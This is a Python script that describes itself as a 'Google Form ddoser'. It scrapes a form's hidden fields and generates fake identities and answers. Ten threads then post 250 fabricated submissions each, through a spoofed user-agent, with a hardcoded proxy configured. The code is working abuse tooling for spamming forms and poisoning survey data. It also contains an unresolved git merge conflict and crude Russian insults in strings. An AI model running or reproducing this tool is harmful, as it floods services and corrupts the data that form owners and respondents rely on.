# -*- coding: utf-8 -*-

from ShG_rand.Identities import RandomRes
from json.decoder import JSONDecodeError
from re import I
import requests
import random
from ShG_rand import Identities     

from LogPython import LogManager
from bs4 import BeautifulSoup
LogManager = LogManager()
import threading
import click

import os
import json
import re
import sys

from http.client import responses

print('Click Version: {}'.format(click.__version__))
print('Python Version: {} \n'.format(sys.version))

proxies = {                                                                      
"https" : "https://85.14.243.31:3128"
}


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4240.80 Safari/537.36 Edg/84.0.622.43'
}

random_num = [1, 5]

<<<<<<< HEAD
_link = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSc6I2ywg_Nl_Aot3lFt1FdPnft0xS5ea62MjVpsGFe76webXQ/formResponse'
=======
_link = 'https://docs.google.com/forms/d/e/1FAIpQLSc6I2ywg_Nl_Aot3lFt1FdPnft0xS5ea62MjVpsGFe76webXQ/formResponse'
>>>>>>> 040bada8a631bd1c727a29dbd8ebd87c457faaa1

jojo = random.choice(random_num)

def erase(a:str, b:int):
    a = a[:b] + a[b + 1:]
    
    return a

def SetLink(change:str, *args):
    try: 
        testing_term = requests.get(change)
    except:
        LogManager.error("Invalid Link (На самом деле инвалид перед экраном)")
        sys.exit(0)
        
    f = open(__file__, "r", encoding = "utf-8")

    regex = r"_link\s*\=\s*\'(.*)\'"        

    current_file = f.read()
    f.close()
    r = re.search(regex, current_file).group(1)

    current_file = current_file.replace(r, change)

    f = open(__file__, "w", encoding = "utf-8")
    f.write(current_file)
    f.close()   
     
    LogManager.info("Link changed")
     
def Response(a, *args, **kwargs):
    
    if len(args) != 0:
        resp = requests.get(erase(args[0], 0))
    else:
        resp = requests.get(_link)
            
    if a == "headers":
        LogManager.info(resp.headers)
    elif a == "content":                                                                
        LogManager.info(resp.content)
        
def StatusCode(*args, **kwargs):
    if len(args) != 0:
        r = requests.get(erase(args[0], 0))
    else:
        r = requests.get(_link)
    
        if r.status_code == 200:
            status = "OK"
            LogManager.info(f"{r} === {status}")
        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
            status = responses[r.status_code]
            LogManager.warning(f"{r} === {status}")
        else:
            status = responses[r.status_code]
            LogManager.error(f"{r} === {status}")

try:
    respG = open("inf.txt", "r", encoding="utf-8").readline()
    respG = json.loads(respG)
except JSONDecodeError:
    LogManager.error("Temp error")
except:
    _temp = open("inf.txt", 'w')
    _temp.close()

def InputUpdater():
    for r in respG:
        r['id'] = 'entry.' + str(r['id'])
                
    return respG 

def LongChecker():
    _ = InputUpdater()
    
    for i in _:
        if i['value'] == "LongAnswer":
            pass

def GetInput():
    
    os.system("node main.js")
                            
def SetInput(a):
    resp = requests.get(a).text
    resp = resp[resp.find("var FB_PUBLIC_LOAD_DATA_ "):]
    resp = resp[:resp.find(',"/forms"')]
                 
    LogManager.info('writing complete')
    
    open('dop.js', 'w', encoding = "utf-8").write("module.exports.Getter = function Getter() {\n" + resp + "]" + "\nreturn FB_PUBLIC_LOAD_DATA_;}")
   
def OtherArgsGetter():
    _resp = requests.get(_link).text
    
    soup = BeautifulSoup(_resp, "lxml")
    
    fvv = soup.find("input", {
        "name" : "fvv"
    }).attrs['value']
               
    draftResponse = soup.find("input", {
        "name" :"draftResponse"
    }).attrs['value']
    
    pageHistory = soup.find("input", {
        "name" : "pageHistory"
    }).attrs['value']
    
    fbzx = soup.find("input", {
        "name" : "fbzx"
    }).attrs['value']
    
    return fvv, draftResponse, pageHistory, fbzx

jojo = InputUpdater()

def RaidServe(ServerList):
    _res = dict()
    
    f = open('LongAns.txt', 'r').readline()
    f = f.replace("'", '"')
    
    _f = json.loads(f)
    
    for i in ServerList:
        if i['value'] == 'LongAnswer':
            for l in _f:
                if i['id'] == l['id']:
                    if l['value'] == 'default':
                        _res[i['id']] == RandomRes(int(input(f"({i['quest']}) Enter fixed random quantity : ")))
                        
    f = open("DopList.txt", "w", encoding = "utf-8")     

    f.write(str(_res))
        
def RaidComporator(ServerList):
    res = dict()
    f = open('LongAns.txt', 'r').readline()
    f = f.replace("'", '"')
    
    _f = json.loads(f)
        
    for i in ServerList:
        if i['value'] == 'LongAnswer':
            for l in _f:
                if i['id'] == l['id']:
                    if l['value'] == 'fio':
                        res[i['id']] = Identities.FIO()
                    elif l['value'] == 'fi':
                        res[i['id']] = Identities.random_surnames("конечно зафиксирую") + Identities.random_names("ладно")
                    elif l['value'] == "default":
                        res[i['id']] = Identities.RandomRes(100)
                    elif l['value'] == "gen":
                        res[i['id']] = Identities.Genders()
                    elif l['value'] == 'name':
                        res[i['id']] = Identities.random_names("да")
                    elif l['value'] == 'surname':
                        res[i['id']] = Identities.random_surnames("поработай на работе")
                    else:
                        res[i['id']] = l['value']
        else:
            res[i['id']] = random.choice(i['value'])                                                                            
      
    fvv, draftResponse, pageHistory, fbzx = OtherArgsGetter()
     
    res['emailAddress'] = "sosat@hidbell.ru"  
    res["fvv"] = fvv
    res["draftResponse"] = draftResponse
    res["pageHistory"] = pageHistory
    res["fbzx"] = fbzx   
                  
    return res          

def AnsSetter():
    _ = InputUpdater()
    
    res = list()
    
    for i in _:  
        _t = dict()
                   
        fio = Identities.FIO()            
                   
        if i['value'] == 'LongAnswer':
            
            j = input(f"{i['quest']}\n Enter long answer: ")
            
            _t["id"] = i["id"][6:]
            _t["value"] = j
            
            res.append(_t)
            
    kk = open("LongAns.txt", "w")
    kk.write(str(res))
                                
def raid(e:int):
        
    for i in range(250):
        
        RaidReqList = RaidComporator(jojo)
                
        r = requests.post(_link, 
                          data = RaidReqList,
                          headers = headers,
                          proxies = None)                               
                
        if r.status_code == 200:
            status = "OK"
            LogManager.info(f"{r} === {e + 1} || {i + 1} === {status}")
        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
            status = responses[r.status_code]
            LogManager.warning(f"{r} === {e + 1} || {i + 1} === {status}")
        else:
            status = responses[r.status_code]
            LogManager.error(f"{r} === {e + 1} || {i + 1} === {status}")

@click.command()
@click.option('--link', default = True, help = 'Show raiding link')
@click.option('--raid', default = 3, help = 'Start ddos any google form`s link')
@click.option('--resp', default = "text", help = "Get response || Post response")
@click.option('--log', default = "jojo", help = "Any actions with logs")
@click.option('--test', default = "OK", help = "For testing commands")
@click.option('--_input', default = "pidor", help = "Enter long answers")
def starter(link, resp, raid, log, test, _input):                                              
    
    """Google Form`s ddoser script`s help`s command:\\//"""
    
    # try:
    if link == "get":
        print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
        print(str(BeautifulSoup(requests.get(_link).text, "lxml").title).replace("title", '').replace("<", '').replace(">", '').replace("/", "") + ' :')
        print(_link)
    if link == "set":
        print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
        SetLink(input(" Enter new raid link: "))

    if resp == "headers":
        Response("headers")                             
    if resp == "content":
        Response("content")
    if "content" in resp and len(resp) != 7:
        Response("content", resp[7:])
    if "headers" in resp and len(resp) != 7:
        Response("headers", resp[7:])
    if "status" in resp and len(resp) != 6:
        StatusCode(resp[6:])
    if "set_input" in resp and len(resp) != 9:
        SetInput(resp[10:])
    if resp == "get_input":                                 
        GetInput()
    if resp == "set_input":
        SetInput(_link);
    if resp == "status":
        StatusCode()
    if log == "cls":
        with open("LogPython_info.log", "w") as log_file:
            log_file.write(" ")

        LogManager.info("Cleaning complete [+]")
    if log == "get":
        for i in LogManager.get_logs(int(input("Enter quantity of logs: ")))[0]:
            print(i, end ="")
    if _input == "set":
        AnsSetter()
    if test == "jojo":
        LongChecker()
    if raid == 1:

        print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
        print('         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \   /\    \ ')
        print('        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\ /::\____\'')
        print('       /:::/    /                \:::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    //:::/    /')
        print('      /:::/    /                  \:::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    //:::/    / ')
        print('     /:::/    /                    \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    //:::/    /  ')
        print('    /:::/____/                      \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    //:::/    /   ')
        print('   /::::\    \                      /::::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    //:::/    /    ')
        print('  /::::::\    \   _____    ____    /::::::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    //:::/    /     ')
        print(' /:::/\:::\    \ /\    \  /\   \  /:::/\:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    //:::/    /      ')
        print('/:::/  \:::\    /::\____\/::\   \/:::/  \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/____//:::/____/       ')
        print('\::/    \:::\  /:::/    /\:::\  /:::/    \::/    /\:::\    \     /:::|____|\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /\:::\    \\:::\    \       ')
        print(' \/____/ \:::\/:::/    /  \:::\/:::/    / \/____/  \:::\    \   /:::/    /  \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\    \\:::\    \      ')
        print('          \::::::/    /    \::::::/    /            \:::\    \ /:::/    /    \:::\   \::::::/    /    \:::\   \:::\    \       \:::\    \\:::\    \     ')
        print('           \::::/    /      \::::/____/              \:::\    /:::/    /      \:::\   \::::/    /      \:::\   \:::\____\       \:::\    \\:::\    \    ')
        print('           /:::/    /        \:::\    \               \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\    \\:::\    \   ')
        print('          /:::/    /          \:::\    \               \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\    \\:::\    \  ')
        print('         /:::/    /            \:::\    \               \::::::/    /            \::::::/    /            \:::\    \               \:::\    \\:::\    \ ')
        print('        /:::/    /              \:::\____\               \::::/    /              \::::/    /              \:::\____\               \:::\____\\:::\____\'')
        print('        \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    / \::/    /')
        print('         \/____/                  \/____/                  ~~                       ~~                       \/____/                  \/____/   \/____/ ')
        print('                                                                                                                                                        ')
        
        start1()
                    
    # except Exception as er:
        # LogManager.error(er)

def start1(): 
    i = 123
    _ = list()
    
    for i in range(10):
        thr = threading.Thread(target = raid, args = [i], daemon = True)
        thr.start()    
        _.append(thr)
        
    [t.join() for t in _]    
        
    LogManager.warning("Raid log out")
        
        # raid(_first_answer_, _second_answer_, _third_answer_, jojo, i)
      
if __name__ == "__main__":  
    
    starter()
    
# 'proxies = {                                                                      
# "https" : "https://159.8.114.34:8123"
# }'

